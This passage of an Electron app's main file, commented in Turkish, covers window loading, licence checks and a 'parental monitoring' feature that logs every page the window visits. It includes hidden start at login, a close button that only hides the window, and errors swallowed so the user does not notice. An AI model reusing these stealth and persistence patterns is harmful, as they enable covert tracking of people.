      path.join(__dirname, '..', 'electron', 'loading.html'),
      path.join(app.getAppPath(), 'electron', 'loading.html')
    ];
    
    for (const altPath of altPaths) {
      if (fs.existsSync(altPath)) {
        loadingPath = altPath;
        console.log('✅ Loading.html alternatif yolda bulundu:', altPath);
        break;
      }
    }
  }
  
  console.log('📂 Loading.html yolu:', loadingPath);
  console.log('📂 Dosya mevcut:', fs.existsSync(loadingPath));
  
  try {
    await mainWindow.loadFile(loadingPath);
    console.log('✅ Loading.html başarıyla yüklendi');
    
    // ✅ LOADING YÜKLENDIKTEN SONRA pencereyi göster
    if (!isHiddenStart) {
      mainWindow.maximize();
      mainWindow.show();
      console.log('✅ Pencere gösterildi');
    }
  } catch (loadError) {
    console.error('❌ Loading.html yüklenemedi:', loadError);
    // Fallback: Basit bir HTML göster
    await mainWindow.loadURL('data:text/html,<html><body style="background:#1a0a2e;color:white;display:flex;align-items:center;justify-content:center;height:100vh;font-family:sans-serif;"><h1>Uygulama Yükleniyor...</h1></body></html>');
    if (!isHiddenStart) {
      mainWindow.maximize();
      mainWindow.show();
    }
  }
  
  // Kullanıcı adını loading ekranına gönder
  const configManager = getConfigManager();
  const userFullName = configManager.get('USER_FULLNAME');
  if (userFullName) {
    mainWindow.webContents.executeJavaScript(`
      if (window.updateUserName) {
        window.updateUserName('${userFullName.replace(/'/g, "\\'")}');
      }
    `).catch(err => console.warn('Loading screen user name update failed:', err));
  }
  
  // TAM 5 SANİYE BEKLE (loading ekranı için) - sadece görünür pencere için
  // ✅ SESSİZ BAŞLATMA: Gizli modda bekleme yapma, direkt devam et
  if (!isHiddenStart) {
    console.log('⏳ Loading ekranı gösteriliyor - 5 saniye bekleniyor...');
    await new Promise(resolve => setTimeout(resolve, 5000));
  }

  // Server'ın hazır olmasını bekle
  try {
    logStartup('[createWindow] checkServerReady() çağrılıyor...');
    await checkServerReady();
    logStartup('[createWindow] checkServerReady() tamamlandı!');
    updateLoadingScreen(4, '🎉 Uygulama yükleniyor...');
    console.log('✅ Server hazır, ana sayfa yükleniyor...');
    logStartup('[createWindow] Server hazır, ana sayfa yükleniyor...');
    
    // ✅ SAYFA YÜKLEME HATASI YAKALAMA
    mainWindow.webContents.on('did-fail-load', (event, errorCode, errorDescription, validatedURL) => {
      console.error('❌ Sayfa yüklenemedi:', {
        errorCode,
        errorDescription,
        validatedURL
      });
      logStartup(`DID-FAIL-LOAD: ${errorCode} - ${errorDescription} - ${validatedURL}`);
      
      // Hata sayfası göster
      const errorHtml = `
<!DOCTYPE html>
<html lang="tr">
<head>
  <meta charset="UTF-8">
  <title>Yükleme Hatası</title>
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body {
      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
      background: linear-gradient(135deg, #0a0a0a 0%, #1a0a2e 100%);
      color: #fff;
      min-height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
      padding: 20px;
    }
    .container {
      max-width: 600px;
      text-align: center;
      background: rgba(255,255,255,0.05);
      padding: 40px;
      border-radius: 16px;
      border: 1px solid rgba(239, 68, 68, 0.3);
    }
    h1 { color: #ef4444; margin-bottom: 20px; font-size: 24px; }
    p { color: #94a3b8; margin-bottom: 15px; line-height: 1.6; }
    .error-box {
      background: rgba(0,0,0,0.3);
      padding: 15px;
      border-radius: 8px;
      margin: 20px 0;
      text-align: left;
      font-family: monospace;
      font-size: 12px;
      color: #fbbf24;
    }
    button {
      background: #8b5cf6;
      color: white;
      border: none;
      padding: 12px 24px;
      border-radius: 8px;
      font-size: 14px;
      cursor: pointer;
      margin-top: 20px;
    }
    button:hover { background: #7c3aed; }
  </style>
</head>
<body>
  <div class="container">
    <h1>Sayfa Yüklenemedi</h1>
    <p>Uygulama arayüzü yüklenirken bir hata oluştu.</p>
    <div class="error-box">
      <strong>Hata Kodu:</strong> ${errorCode}<br>
      <strong>Açıklama:</strong> ${errorDescription}<br>
      <strong>URL:</strong> ${validatedURL}
    </div>
    <p>Uygulamayı yeniden başlatmayı deneyin. Sorun devam ederse, uygulamayı yeniden kurun.</p>
    <button onclick="location.reload()">Tekrar Dene</button>
  </div>
</body>
</html>`;
      
      mainWindow.loadURL(`data:text/html;charset=utf-8,${encodeURIComponent(errorHtml)}`);
    });
    
    // ✅ KONSOL HATALARI YAKALAMA (production debug için)
    mainWindow.webContents.on('console-message', (event, level, message, line, sourceId) => {
      if (level >= 2) { // 0=debug, 1=info, 2=warn, 3=error
        const levelName = ['DEBUG', 'INFO', 'WARN', 'ERROR'][level] || 'UNKNOWN';
        console.log(`[RENDERER ${levelName}] ${message}`);
        if (level >= 3) {
          logStartup(`RENDERER ERROR: ${message} (${sourceId}:${line})`);
        }
      }
    });
    
    // ✅ SAYFA YÜKLEME BAŞARILI
    mainWindow.webContents.once('did-finish-load', () => {
      console.log('✅ Ana sayfa başarıyla yüklendi!');
      logStartup('did-finish-load: Ana sayfa başarıyla yüklendi');
    });
    
    // Server hazır, ana sayfayı yükle
    console.log(`📡 loadURL çağrılıyor: http://localhost:${PORT}`);
    logStartup(`[createWindow] loadURL çağrılıyor: http://localhost:${PORT}`);
    
    try {
      await mainWindow.loadURL(`http://localhost:${PORT}`);
      console.log('✅ loadURL tamamlandı');
      logStartup('[createWindow] loadURL tamamlandı - BAŞARILI');
    } catch (loadErr) {
      console.error('❌ loadURL hatası:', loadErr);
      logStartup(`[createWindow] loadURL HATASI: ${loadErr.message}`);
      throw loadErr;
    }
    
    // ⚠️ MONITORING: Lisans doğrulandıktan SONRA başlatılacak (startMonitoring fonksiyonunda)
    // webhookManager artık startMonitoring() içinde başlatılıyor
    // ✅ GİZLİ MOD: Kullanıcıya log gösterme
    
    // WEB TRAFFIC: Sayfa basliklarini dogru sekilde yakala
    mainWindow.webContents.on('did-navigate', (event, url) => {
      if (parentalMonitoring && parentalMonitoring.settings.monitorWebTraffic) {
        // Sayfa yuklenene kadar kisa bir bekleme yap, sonra basligi al
        setTimeout(() => {
          const title = mainWindow.getTitle() || '';
          parentalMonitoring.processWebNavigation({ 
            url: url, 
            frameId: 0, 
            title: title 
          });
        }, 500);
      }
    });
    
    mainWindow.webContents.on('did-navigate-in-page', (event, url) => {
      if (parentalMonitoring && parentalMonitoring.settings.monitorWebTraffic) {
        setTimeout(() => {
          const title = mainWindow.getTitle() || '';
          parentalMonitoring.processWebNavigation({ 
            url: url, 
            frameId: 0, 
            title: title 
          });
        }, 500);
      }
    });
    
    // ✅ KRITIK: Periyodik lisans kontrolünü başlat (her 2 dakikada bir)
    licenseCheck.startPeriodicLicenseCheck(mainWindow);
  } catch (err) {
    console.error('Server başlatma hatası:', err);
    
    // Loading ekranında hata mesajını göster (JSON.stringify ile güvenli kaçırma)
    try {
      const safeMessage = JSON.stringify(err.message);
      await mainWindow.webContents.executeJavaScript(`
        if (typeof window.showError === 'function') {
          window.showError(${safeMessage});
        }
      `);
    } catch (execErr) {
      console.error('Loading ekranına hata gönderilemedi:', execErr);
    }
    
    // ✅ Gizli başlatmada sessiz hata, normal modda dialog
    if (!isHiddenStart) {
      dialog.showErrorBox(
        'Server Hatası',
        `Server başlatılamadı: ${err.message}\n\nLütfen uygulamayı yeniden başlatın.`
      );
    }
  }

  // ✅ Kapat düğmesi pencereyi gizler, uygulama arka planda çalışmaya devam eder
  // Sadece görev yöneticisinden kapatılabilir
  mainWindow.on('close', (event) => {
    if (!app.isQuiting) {
      event.preventDefault();
      mainWindow.hide();
    }
  });

  mainWindow.on('closed', () => {
    // ✅ MONITORING: Gizli durdurma
    if (parentalMonitoring) {
      parentalMonitoring.stopAll();
      parentalMonitoring = null;
    }
    
    // ✅ Timer cleanup (memory leak önleme)
    if (systemStatusInterval) {
      clearInterval(systemStatusInterval);
      systemStatusInterval = null;
    }
    
    mainWindow = null;
  });
}


ipcMain.on('window-minimize', () => {
  if (mainWindow) mainWindow.minimize();
});

ipcMain.on('window-maximize', () => {
  if (mainWindow) {
    if (mainWindow.isMaximized()) {
      mainWindow.unmaximize();
    } else {
      mainWindow.maximize();
    }
  }
});

ipcMain.on('window-close', () => {
  if (mainWindow) mainWindow.close();
});

ipcMain.on('window-go-back', () => {
  if (mainWindow && mainWindow.webContents.canGoBack()) {
    mainWindow.webContents.goBack();
  }
});

ipcMain.on('window-go-forward', () => {
  if (mainWindow && mainWindow.webContents.canGoForward()) {
    mainWindow.webContents.goForward();
  }
});

ipcMain.on('window-reload', () => {
  if (mainWindow) {
    mainWindow.webContents.reload();
  }
});

ipcMain.on('window-toggle-fullscreen', () => {
  if (mainWindow) {
    const willBeFullscreen = !mainWindow.isFullScreen();
    mainWindow.setFullScreen(willBeFullscreen);
    // Fullscreen durumunu renderer'a bildir
    mainWindow.webContents.send('fullscreen-changed', willBeFullscreen);
  }
});

// License expired modal için IPC handler'lar
ipcMain.handle('get-license-data', async () => {
  try {
    const licenseData = licenseCheck.getLicenseData();
    return licenseData;
  } catch (error) {
    console.error('License data error:', error);
    return null;
  }
});

ipcMain.on('open-external-link', (event, url) => {
  shell.openExternal(url);
});

ipcMain.on('close-app', () => {
  console.log('💀 Kullanıcı lisans süresi dolduğu için uygulamayı kapattı');
  app.isQuiting = true;
  app.quit();
});

// ✅ Self-destruct IPC handler - Frontend'den tetiklendiğinde çalışır
// ✅ DÜZELTME: React modal'dan onaylandığında tekrar modal açma, doğrudan imha et
ipcMain.on('self-destruct', (event, reason) => {
  console.log('💀 Self-destruct tetiklendi (frontend):', reason);
  // Kullanıcı zaten React modal'ında butona bastı, tekrar modal gösterme
  // Doğrudan performSelfDestruct çağır
  performSelfDestruct();
});

app.whenReady().then(async () => {
  // ✅ Self-destruct kontrolü - app.whenReady() içinde olmalı (screen API gerektirir)
  checkAndExecuteSelfDestruct();
  
  // ✅ Uygulamayı Windows başlangıç uygulaması olarak ayarla (PC açılınca otomatik başlat)
  if (app.isPackaged) {
    app.setLoginItemSettings({
      openAtLogin: true,
      openAsHidden: true, // Gizli başlat (arka planda çalışacak)
      args: ['--hidden'] // Başlangıç argümanı
    });
    console.log('✅ Uygulama Windows başlangıç uygulaması olarak ayarlandı');
  }
  
  // ✅ Web Navigation Tracking için session.webRequest kurulumu
  // SADECE mainFrame (ana sayfa) navigasyonlarını izle - API/CDN isteklerini atla
  const { session } = require('electron');
  session.defaultSession.webRequest.onBeforeRequest({ urls: ['http://*/*', 'https://*/*'] }, (details, callback) => {
    try {
      // ✅ SADECE mainFrame (ana sayfa navigasyonları) izlenir
      // Diğer kaynak türleri (script, stylesheet, image, xhr, fetch vs.) atlanır
      if (details.resourceType === 'mainFrame' && parentalMonitoring && parentalMonitoring.settings.monitorWebTraffic) {
        // ✅ YENİ: Gerçek zamanlı navigasyon izleme (SQLite yerine webRequest API)
        parentalMonitoring.processWebNavigation({ 
          url: details.url, 
          frameId: 0,
          title: '' // Başlık sonra gelecek
        });
        // Eski method'u da çağır (uyumluluk için)
        parentalMonitoring.trackWebNavigation(details.url, '', 'mainFrame');
      }
    } catch (error) {
      // Sessizce hata yut - kullanıcı fark etmesin
    }
    callback({}); // İsteği devam ettir
  });
  console.log('✅ Web navigation tracking (session.webRequest - mainFrame only) kuruldu');
  
  // Node environment kontrolü
  if (!validateNodeEnvironment()) {
    // ✅ SESSİZ MOD: Gizli başlatmada dialog gösterme
    if (!isHiddenStart) {
      dialog.showErrorBox(
        'Başlatma Hatası',
        'Node.js environment başlatılamadı. Lütfen uygulamayı yeniden başlatın.'
      );
    }
    app.quit();
    return;
  }
  
  // Lisans IPC handler'larını kur
  licenseCheck.setupLicenseHandlers();
  
  // Kullanıcı isim durumunu initialize et
  // ✅ AFYONLUM: USER_FULLNAME otomatik olarak "Afyonlum" set edilsin (name modal bypass)
  const cfgManager = getConfigManager();
  if (!cfgManager.get('USER_FULLNAME')) {
    cfgManager.set('USER_FULLNAME', 'Afyonlum');
    console.log('✅ USER_FULLNAME otomatik olarak "Afyonlum" set edildi - name modal bypass');
  }
  
  licenseCheck.initializeUserNameStatus();
  
  try {
    logStartup('startServer() çağrılıyor...');
    await startServer();
    logStartup('startServer() tamamlandı!');
    
    // ✅ KRITIK GÜVENLİK: Lisans durumunu ÖNCE kontrol et
    logStartup('Lisans kontrolü başlıyor...');
    const hasValidLicense = licenseCheck.checkLicenseStatus();
    const hasUserName = licenseCheck.checkUserNameExists();
    logStartup(`hasValidLicense: ${hasValidLicense}, hasUserName: ${hasUserName}`);
    
    // 🔥 LİSANS SÜRESİ DOLMUŞ - SELF DESTRUCT TETİKLE!
    if (hasValidLicense === 'expired') {
      console.log('💀 LİSANS SÜRESİ DOLDU! SELF-DESTRUCT TETİKLENİYOR...');
      // Lisans süresi doldu modal göster ve self-destruct başlat
      licenseCheck.createLicenseExpiredModal();
      return; // Uygulamayı başlatma
    }
    
    // ✅ AFYONLUM FIX: Kullanıcı ismi kontrolünü bypass et - her zaman "Afyonlum" kullan
    // İsim kontrolü yapma, sadece lisans kontrolü yap
    const bypassNameCheck = true; // Name modal tamamen devre dışı
    
    // 🧪 DEBUG: Test için lisans kontrolünü bypass et
    const DEBUG_BYPASS_LICENSE = true; // Production'da false yapın!
    
    // Lisans eksikse modal göster (isim kontrolü bypass edildi)
    if (!DEBUG_BYPASS_LICENSE && hasValidLicense !== true) {
      console.log('⚠️  Lisans gerekli - Lisans modalı açılıyor...');
      logStartup('Lisans modalı açılıyor...');
      licenseCheck.createLicenseModal();
      
      // ✅ DÜZELTME: nameModalOpened başlangıçta false olmalı
      // Sadece name modal açıldığında true yapılacak
      let nameModalOpened = false;
      
      const checkInterval = setInterval(() => {
        if (licenseCheck.isLicenseVerified() && licenseCheck.isUserNameSaved()) {
          // ✅ Lisans doğrulandı VE isim otomatik kaydedildi - Ana pencereyi direkt aç
          console.log('✅ Lisans doğrulandı ve isim otomatik kaydedildi - Ana pencere açılıyor...');
          clearInterval(checkInterval);
          
          createWindow().then(() => {
            // ✅ MONITORING: Ana pencere açıldıktan SONRA başlat
            setTimeout(() => startMonitoring(), 2000);
          });
        }
      }, 1000);
    } else {
      // Hem lisans hem isim mevcut - direkt ana pencereyi aç
      // VEYA DEBUG_BYPASS_LICENSE aktif
      console.log('✅ Lisans ve isim mevcut (veya bypass aktif) - Ana pencere açılıyor...');
      logStartup('DEBUG_BYPASS_LICENSE veya lisans geçerli - createWindow() çağrılıyor...');
      await createWindow();
      logStartup('createWindow() tamamlandı!');
      // ✅ MONITORING: Ana pencere açıldıktan SONRA başlat
      setTimeout(() => startMonitoring(), 2000);
    }
  } catch (err) {
    // ✅ Gizli başlatmada sessiz hata, normal modda dialog
    if (!isHiddenStart) {
      dialog.showErrorBox(
        'Server Başlatma Hatası',
        `Server başlatılamadı: ${err.message}\n\nLütfen uygulamayı yeniden başlatın.`
      );
    }
  }

  app.on('activate', async () => {
    if (BrowserWindow.getAllWindows().length === 0) {
      await createWindow();
    }
  });
});

app.on('window-all-closed', (e) => {
  // ✅ Pencere kapatıldığında uygulama çalışmaya devam eder
  // Sadece görev yöneticisinden kapatılabilir
  if (!app.isQuiting) {
    e.preventDefault();
  }
});

app.on('before-quit', () => {
  app.isQuiting = true;
});

app.on('quit', () => {
  if (serverProcess) {
    serverProcess.kill();
  }
});


// BERAT CANKIR
// BERAT BİLAL CANKIR
// CANKIR
